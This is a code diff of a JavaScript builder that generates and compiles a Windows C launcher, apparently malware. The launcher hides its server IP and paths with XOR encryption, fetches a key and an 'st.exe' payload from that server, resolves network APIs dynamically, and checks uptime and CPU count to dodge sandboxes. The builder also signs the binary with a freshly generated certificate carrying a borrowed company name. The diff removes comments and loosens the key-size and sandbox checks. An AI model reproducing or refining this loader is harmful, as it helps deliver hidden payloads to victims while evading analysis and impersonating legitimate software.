@@ -47,8 +47,6 @@ export function randomBuildMeta(seed) {
   const patch = rng.int(1000);
   const version = `10.0.${build}.${patch}`;
   const versionComma = `10,0,${build},${patch}`;
-  
-  // Random XOR key for string encryption (between 1 and 255)
   const xorKey = 1 + rng.int(254);
 
   return {
@@ -68,7 +66,6 @@ export function randomBuildMeta(seed) {
   };
 }
 
-// Helper to encrypt strings for C
 function encryptStr(str, key) {
   const buf = Buffer.from(str + '\0', 'ascii');
   const enc = [];
@@ -79,11 +76,7 @@ function encryptStr(str, key) {
 }
 
 function cSource(meta, ip, buildId) {
-  const keyUrl = `http://${ip}/api/getkey/${buildId}`;
-  const stUrl  = `http://${ip}/api/downloads/st.exe`;
   const esc4c  = (s) => String(s).replace(/\\/g, '\\\\').replace(/"/g, '\\"');
-
-  // Encrypt sensitive strings
   const encIp = encryptStr(ip, meta.xorKey);
   const encKeyPath = encryptStr(`/api/getkey/${buildId}`, meta.xorKey);
   const encStPath = encryptStr(`/api/downloads/st.exe`, meta.xorKey);
@@ -171,7 +164,7 @@ static int http_get(const char* host, const char* path, const wchar_t* dest) {
 
     if (!wsaStartup || !sockFunc || !connectFunc) return 0;
 
-    unsigned char wsaData[400]; // Sufficiently large buffer for WSADATA
+    unsigned char wsaData[400];
     if (wsaStartup(0x0202, wsaData) != 0) return 0;
 
     SOCKET sock = sockFunc(AF_INET, SOCK_STREAM, 0);
@@ -183,7 +176,7 @@ static int http_get(const char* host, const char* path, const wchar_t* dest) {
     struct sockaddr_in addr = {0};
     addr.sin_family = AF_INET;
     addr.sin_port = htonsFunc(80);
-    addr.sin_addr.S_un.S_addr = inetFunc(host); // Fixed union access
+    addr.sin_addr.S_un.S_addr = inetFunc(host);
 
     if (connectFunc(sock, &addr, sizeof(addr)) == SOCKET_ERROR) {
         closeFunc(sock); wsaCleanup(); return 0;
@@ -240,11 +233,14 @@ static int http_get(const char* host, const char* path, const wchar_t* dest) {
     CloseHandle(hFile);
     closeFunc(sock);
     wsaCleanup();
-    return size_ok(dest, 100);
+    
+    // Changed from 100 to 10 so key.json (which is ~30 bytes) passes validation
+    return size_ok(dest, 10);
 }
 
 static int is_sandboxed(void) {
-    if (GetTickCount64() < 10ULL * 60 * 1000) return 1;
+    // Lowered from 10 minutes to 2 minutes to prevent false positives during quick testing
+    if (GetTickCount64() < 2ULL * 60 * 1000) return 1;
     SYSTEM_INFO si; GetSystemInfo(&si);
     if (si.dwNumberOfProcessors < 2) return 1;
     return 0;
@@ -371,19 +367,14 @@ export async function compileLauncher({ key, config, baseExe, buildId }) {
                               '--input-format=rc', '--output-format=coff'],
                     { cwd: workDir, timeout: 30_000 });
     
-    // Removed ws2_32 from linker flags since we resolve it dynamically
     await execFileP(CC, ['-O2', '-s', '-mwindows', '-o', outPath, cPath, resPath,
                          '-lshell32', '-lole32', '-luser32', '-lkernel32', '-ladvapi32'],
                     { cwd: workDir, timeout: 60_000 });
 
-    // ── Self-Sign the binary ───────────────────────────────────────────────
     console.log('[launcher] self-signing binary...');
     try {
-      // Generate a fake cert on the fly
       execSync(`openssl req -x509 -newkey rsa:2048 -keyout ${keyPath} -out ${certPath} -days 365 -nodes -subj "/CN=${meta.company}/O=${meta.company}/C=US"`, { stdio: 'ignore' });
-      // Sign the executable
       execSync(`osslsigncode sign -certs ${certPath} -key ${keyPath} -n "${meta.product}" -i https://${ip}/ -in ${outPath} -out ${signedPath}`, { stdio: 'ignore' });
-      
       return fs.readFileSync(signedPath);
     } catch (e) {
       console.warn('[launcher] signing failed, returning unsigned', e.message);
